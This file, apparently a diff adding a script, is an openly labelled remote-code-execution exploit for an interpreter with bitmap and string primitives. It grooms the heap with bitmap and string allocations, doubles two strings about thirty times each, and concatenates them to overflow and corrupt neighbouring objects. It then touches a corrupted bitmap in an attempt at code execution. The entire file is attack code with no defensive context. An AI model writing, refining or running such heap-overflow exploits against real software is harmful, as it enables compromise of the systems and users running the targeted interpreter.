@@ -1,0 +1,91 @@
+# Refined RCE Exploit - Heap Grooming for Code Execution
+# 
+# This version attempts to shape the heap before triggering overflow
+# to achieve code execution, not just a crash
+
+# Step 1: Heap Grooming - Allocate objects to shape heap layout
+bitmap b1 = create(100, 100);
+bitmap b2 = create(100, 100);
+bitmap b3 = create(100, 100);
+string sgroom1 = "GROOM1";
+string sgroom2 = "GROOM2";
+
+# Step 2: Build large strings for overflow
+string s1 = "A";
+string s2 = "B";
+
+# Build s1 to large size
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+
+# Build s2 to large size
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+
+# Step 3: Trigger overflow to corrupt heap
+# This will overflow and potentially corrupt b1, b2, b3 or other heap structures
+string exploit = s1 + s2;
+
+# Step 4: Try to use corrupted objects to achieve code execution
+# If heap metadata or function pointers were corrupted, this might trigger RCE
+set(b1, 0, 0, 1);
+int val = get(b1, 0, 0);
+print(val);
+
+print("RCE attempt completed");
+
